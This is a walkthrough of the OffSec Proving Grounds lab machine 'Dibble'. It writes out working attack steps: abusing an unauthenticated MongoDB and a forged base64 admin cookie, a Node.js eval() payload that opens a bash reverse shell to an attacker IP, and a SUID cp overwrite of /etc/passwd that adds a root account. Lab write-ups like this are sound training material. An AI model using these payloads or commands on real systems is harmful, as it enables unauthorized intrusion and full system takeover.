---
title: "PG: Dibble"
date: 2023-03-07
draft: false
os: "Linux"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/dibble/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - linux
  - nodejs
  - eval-rce
  - mongodb
  - suid
  - gtfobins
categories:
  - walkthrough
---

{{< box-info name="Dibble" os="Linux" difficulty="Medium" ip="192.168.179.110" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.46 ((Fedora))
3000/tcp  open  http    Node.js (Express middleware)
27017/tcp open  mongodb MongoDB 4.2.9
```
{{< /collapse >}}

Fedora box with a busy surface. Anonymous FTP is allowed but the listing hangs and holds nothing. Port 80 is a stock **Drupal 9.0.6** install page (`/core/install.php`) — a red herring that goes nowhere. The two ports that matter are the **MongoDB** on 27017 (exposed with no auth) and the **Node.js/Express** app on 3000.

### Port 27017 - Unauthenticated MongoDB

MongoDB is bound externally with no authentication. Connect with the `mongo` client and walk the databases — the interesting one is `account-app`:

```
use account-app
show collections     # logmsg, users
db.users.find()
```

```json
{ "username" : "administrator",
  "password" : "ab6edb97f0c7a6455c57f94b7df73263e57113c85f38cd9b9470c8be8d6dd8ac" }
```

The `logmsg` collection leaks a handful of usernames (`administrator`, `Happy_message`, `comprendre`, `Mayroong`) and the same event-log messages the web app renders. The `administrator` SHA-256 hash refuses to crack, so it's a dead end for credentials — but the recon confirms MongoDB is the app's backing store, which means anything we can register or edit here shows up on port 3000.

### Port 3000 - Node.js Event Logger

The Express app is a simple event logger with `/users` and `/logs` sections. You can self-register, and because MongoDB is wide open you can also edit records directly. The `/logs` endpoint is where the box opens up.

---

## Foothold

### eval() RCE in the /logs message field

Submitting a new event log requires an elevated role. Access is gated only by a client-side cookie — set `userLevel` to base64 of `admin` (`YWRtaW4=`) and the app lets you post to `/logs/new`.

The `/users` endpoint is not injectable, but `/logs` is. Drop arithmetic into the fields and send the request: the `username` value comes back verbatim, but `msg=45 - 19` renders as **26**. The server is running the `msg` field through `eval()`.

![Burp showing the msg field evaluated server-side — 45 - 19 returns 26 while username stays literal](/images/dibble/nodejs-rce.png)

With server-side `eval()` on `msg`, weaponizing to a shell is a one-liner using Node's `child_process`:

```javascript
require("child_process").exec('bash -i >& /dev/tcp/192.168.49.179/80 0>&1')
```

Start a listener, submit that as the `msg` value (URL-encode it in Burp), and catch the callback as `benjamin`:

![Reverse shell payload in the msg field and the caught shell as benjamin@dibble](/images/dibble/reverse-shell.png)

```
listening on [any] 80 ...
connect to [192.168.49.179] from (UNKNOWN) [192.168.179.110]
[benjamin@dibble app]$ whoami
benjamin
```

---

## Privilege Escalation

### SUID cp → rewrite /etc/passwd

A SUID scan (`find / -perm -4000 2>/dev/null`) turns up a non-standard entry: `/usr/bin/cp` carries the SUID bit. Since `cp` runs as root, it can overwrite any file on disk — including `/etc/passwd`.

Forge a rogue root user, copy the real `passwd` to a writable path, append the new line, and use SUID `cp` to drop it back over the original:

```bash
# 1. hash a password for the rogue account
openssl passwd -1 -salt evil <password>

# 2. copy /etc/passwd out, append a UID 0 user, then overwrite with SUID cp
cp /etc/passwd /tmp/passwd
echo 'evil_root:$1$evil$B1cg.QF41pkr9LUa9L0vm1:0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd

# 3. switch to the rogue root
su evil_root
```

![/etc/passwd carrying the injected evil_root UID 0 account, then su evil_root](/images/dibble/privesc.png)

`su evil_root` drops a root shell.

---

## Proof

```
[benjamin@dibble ~]$ cat local.txt
015d5d7d3fe1bf353fae57040662e347
```

![Root shell — proof.txt and whoami confirming root](/images/dibble/root-flag.png)

```
[root@dibble ~]# cat proof.txt
ab7a16e74eb29575042025b474650ff8
```

---

## Key Takeaways

{{< callout type="note" >}}
- An externally exposed MongoDB with no auth is both a data leak *and* a write primitive — it feeds the app on 3000, so anything you plant in the DB renders in the front end.
- Any user-controlled value that reaches `eval()` is RCE. Probe suspect fields with harmless arithmetic (`45 - 19` → `26`) to confirm server-side evaluation before weaponizing with `child_process`.
- Access gated purely by a base64 cookie (`userLevel=YWRtaW4=`) is no gate at all — decode and forge it.
- A SUID `cp` is a full privesc: it writes any file as root. Overwriting `/etc/passwd` with a UID 0 account is the classic GTFOBins move.
{{< /callout >}}
